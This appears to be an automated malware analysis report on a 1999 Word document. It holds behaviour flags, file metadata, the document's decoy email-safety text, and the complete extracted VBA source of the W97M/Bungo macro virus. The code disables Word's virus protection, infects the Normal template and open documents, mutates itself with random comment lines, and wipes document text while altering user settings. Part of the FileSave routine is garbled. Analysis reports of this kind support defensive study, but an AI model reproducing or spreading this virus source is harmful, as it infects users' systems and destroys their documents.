behavior.AutoClose: Runs when the Word document is closed
behavior.AutoExec: Runs when the Word document is opened
behavior.AutoNew: Runs when a new Word document is created
behavior.AutoOpen: Runs when the Word document is opened
behavior.Call: May call a DLL using Excel 4 Macros
behavior.Chr: May attempt to obfuscate specific str
behavior.CodeModule: May attempt to modify the VBA code
behavior.Hex Strings: Hex-encoded str were detected, may be used to obfuscate str
behavior.VBA Stomping: VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code
behavior.VBComponents: May attempt to modify the VBA code
behavior.VBProject: May attempt to modify the VBA code

docinfo.macro:
'Virus Name: W97M/Bungo
'Author Name: Lucky Warrior
'Copyright (c) 1999 Bgy. Tiguib, O.E.S.
'All rights reserved.

'I dedicate this virus to my roommates, namely:
'Tom, Deo, Allan, ArnoldBig, ArnoldSmall, Mike & Ruel
'
'Thanks Guys!! for everything...
'
'-Lucky Warrior 10 November 1999
'END


Sub AutoOpen()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub FileSave()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate

DocInfect = True

Next

GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
ActiveDocument.Save
End Sub

Sub GoToHell()
On Error Resume Next
Randomize
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule.CountOfLines
If ActiveLines > 300 Then
With Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule
For TheLine = 1 To .CountOfLines
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Next TheLine
End With
Else
With Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule
PolySize = Int(Rnd * 10)
For PolyMorphic = 1 To PolySize
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Next PolyMorphic
End With
End If
End Sub

Sub Payload()
  On Error Resume Next
    If Day(Now) = Day(Now) And Minute(Now) <= 30 Then
    Selection.Wholestory
    Selection.Cut
    End If
  ActiveDocument.SaveAs ActiveDocument.FullName
  CommandBars("tools").Controls("Macro").Delete
  CommandBars("tools").Controls("Templates and add-ins...").Delete
  Application.Username = "Lucky Warrior"
  Application.UserInitials = "LW"
  Application.UserAddress = "Bgy. Tiguib, O.E.S."
  With Dialogs(wdDialogFileSummaryInfo)
  .Author = "Lucky Warrior"
  .Keywords = "W97M/Bungo"
  .Comments = "More to come..."
  .Execute
  End With
End Sub

filetype: Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1252, Title: Some good advice before opening an email from a source you don't trust is:, Author: Lucky Warrior, Template: Normal, Last Saved By: Lucky Warrior, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 01:00, Create Time/Date: Fri Nov 12 08:51:00 1999, Last Saved Time/Date: Fri Nov 12 08:52:00 1999, Number of Pages: 1, Number of Words: 103, Number of Characters: 589, Security: 0

dump: Some good advice before opening an email from a source you don't trust is:
1: First check the email through the preview window and read thetext.
2: If the text is in anyway suspect then, either delete it or contact your Administrator.
3: Do not launch any attachments by selecting and double clicking or by saving to the Hard-disk and launching from a file manager
4: Scan all attachments before deciding to execute them.
If there are no attachments but a rather descriptive sometimes
colourful warning to the user then consider that email a Hoax and delete it.
Do not forward it on to others as this is exactly what the originator intended
Advice: compliments of the NAI AVERT Labs
Some good advice before opening an email from a source you don't trust is:
Some good advice before opening an email from a source you don't trust is:
I dedicate this virus to my roommates, namely:
Tom, Deo, Allan, ArnoldBig, ArnoldSmall, Mike & Ruel
